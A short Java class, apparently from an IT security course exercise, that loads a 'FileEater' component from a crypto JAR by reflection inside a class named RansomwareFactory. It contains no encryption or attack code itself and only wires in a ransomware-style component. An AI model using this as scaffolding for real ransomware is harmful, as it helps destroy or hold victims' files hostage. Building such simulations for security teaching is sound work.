package leverCom;

import configuration.Configuration;

import java.io.File;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.Arrays;


public class RansomwareFactory {
    @SuppressWarnings("unchecked")
    public static Object build() {
        Object compPort = null;

        try {
            URL[] urls = {new File(Configuration.instance.pathToJavaArchive + "ITSec1_Crypto_Component.jar").toURI().toURL()};
            URLClassLoader urlClassLoader = new URLClassLoader(urls, RansomwareFactory.class.getClassLoader());
            Class fileEaterClass = Class.forName("FileEater", true, urlClassLoader);
            Object fileEaterInstance = fileEaterClass.getMethod("getInstance").invoke(null);
            compPort = fileEaterClass.getDeclaredField("port").get(fileEaterInstance);
        } catch (Exception ex) {
            System.err.println(ex.getMessage());
            ex.printStackTrace();
        }

        return compPort;
    }
}
